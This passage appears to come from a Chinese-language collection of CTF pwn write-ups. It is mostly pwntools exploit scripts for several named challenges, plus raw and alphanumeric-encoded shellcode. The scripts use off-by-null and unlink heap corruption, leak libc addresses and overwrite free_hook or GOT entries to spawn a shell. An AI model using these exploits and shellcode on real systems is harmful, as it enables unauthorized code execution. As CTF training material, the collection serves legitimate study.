		mov  rdi,rax
		mov  rsi,rsp
		xor  rdx,rdx
		mov  dl,0x30
		xor  rax,rax
		syscall
		xor  rdi,rdi
		inc  rdi
		mov  rsi,rsp
		xor  rdx,rdx
		mov  dl,0x30
		xor  rax,rax
		mov  al,0x1
		syscall
		'''
    # debug()
    sl(asm(payload))
```
或者这个
```python
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M154I04050H01050104012x0x4I7N0R1m0Q0V0501000z0I041l1L3P8P1O3r0c3W1702197o0S113e0Z020o0Z0T7p0x3P3N7k0416002s0Y040b2x4x310Y0s0h0l061m01
```


### qctf_2018_babyheap
off by null
```python
def exp():
    create(0x100-0x8,'a')
    create(0x650-0x8,'a'*0x5f0+p64(0x600)+p64(0x50))
    create(0x500,'a')
    create(0x100,'p')

    delete(0)
    delete(1)

    create(0x100-0x8,'a'*0xf8)
    create(0x500-0x8,'a')
    create(0x100-0x8,'cc')

    delete(1)
    delete(2)

    create(0x500-0x8,'b')
    show()
    ru("4 : ")
    libc_base=u64(rv(6).ljust(8,'\x00'))-0x3ebc40-96
    info("libc_base: "+hex(libc_base))
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))
    free_hook=libc_base+libc.symbols['__free_hook']
    ogg=libc_base+0x4f2c5
    info("ogg: "+hex(ogg))

    create(0x100-0x8,'c')
    delete(4)
    delete(2)

    create(0x100-0x8,p64(free_hook))
    create(0x100-0x8,p64(free_hook))
    create(0x100-0x8,p64(ogg))

    

```

### secretHolder_hitcon_2016
```python
def exp():
    free_got=elf.got['free']
    puts_plt=elf.plt['puts']
    puts_got=elf.got['puts']
    create(1,'aa')
    create(2,'bb')
    delete(1)
    create(3,'cc')
    delete(1)
    create(1,p64(0)+p64(0x21)+p64(0x6020B0-0x18)+p64(0x6020B0-0x10)+p64(0x20))
    delete(2)
    edit(1,p64(0)+p64(free_got)+p64(free_got))
    edit(3,p64(puts_plt))
    create(2,'dd')
    edit(1,p64(0)+p64(puts_got))
    delete(2)

    puts_got=u64(rv(6).ljust(8,'\x00'))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.symbols['puts']
    info("libc_base: "+hex(libc_base))
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))
    ogg=libc_base+0xf02a4
    info("ogg: "+hex(ogg))
    system_addr=libc_base+libc.sym['system']


    delete(3)
    create(2,'cc')
    edit(1,p64(0)+p64(free_got))
    edit(2,p64(system_addr))
    delete(2)
    create(3,'/bin/sh\x00')
    delete(3)
```

### rctf_2019_shellcoder
这题非常妙 首先是只能执行7字节的shellcode 这当然不够getshell 但是我们可以写一个汇编 向当前位置重新写入人意字节的shellcode从而getshell 而这个汇编也是根据当前状况写的 非常妙

```python
def exp():
    ru(":")
    # debug()
    sd(asm('xchg rsi,rdi;mov dl,0xff;syscall'))
    sd(asm('nop')*0x10+asm(shellcraft.sh()))
```

### arr_sun_2016
```python
def exp():
    puts_plt=elf.plt['puts']
    # print(puts_plt)
    puts_got=elf.got['puts']
    # main=elf.symbols['main']
    ru("?")
    sl("/bin/sh")
    
    ru("index")
    sl(str(0x8000000d-0x100000000))
    ru("value")
    sl(str(puts_plt))
    
    ru("index")
    sl(str(0x8000000d-0x100000000+1))
    ru("value")
    sl(str(0x804872c))

    ru("index")
    sl(str(0x8000000d-0x100000000+2))
    ru("value")
    sl(str(puts_got))

    for i in range(0,7):
        ru("index")
        sl(str(0))
        ru("value")
        sl(str(0))

    ru("0 0 0 0 0 0 0 0 0 0 ")
    puts_got=u32(rv(4))
    log.info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.symbols['puts']
    log.info("libc_base: "+hex(libc_base))
    binsh=libc_base+libc.search("/bin/sh").next()
    log.info("binsh: "+hex(binsh))
    scanf_plt=elf.plt['__isoc99_scanf']
    ru("?")
    # gdb.attach(sh)
    sl("/bin/sh")

    ru("index")
    sl(str(0x8000000d-0x100000000))
    ru("value")
    sl(str(scanf_plt))

    ru("index")
    sl(str(0x8000000d-0x100000000+1))
    ru("value")
    sl(str(0x804857b))

    ru("index")
    sl(str(0x8000000d-0x100000000+2))
    ru("value")
    sl(str(0x0804882F))

    ru("index")
    sl(str(0x8000000d-0x100000000+3))
    ru("value")
    sl(str(0x08049B30))

    ru("index")
    sl(str(0x8000000d-0x100000000+4))
    ru("value")
    sl(str(0x08049B30))

    for i in range(0,5):
        ru("index")
        sl(str(0))
        ru("value")
        if i==4:
            pass
            # gdb.attach(sh,"b *0x080486A8")
        sl(str(0))
```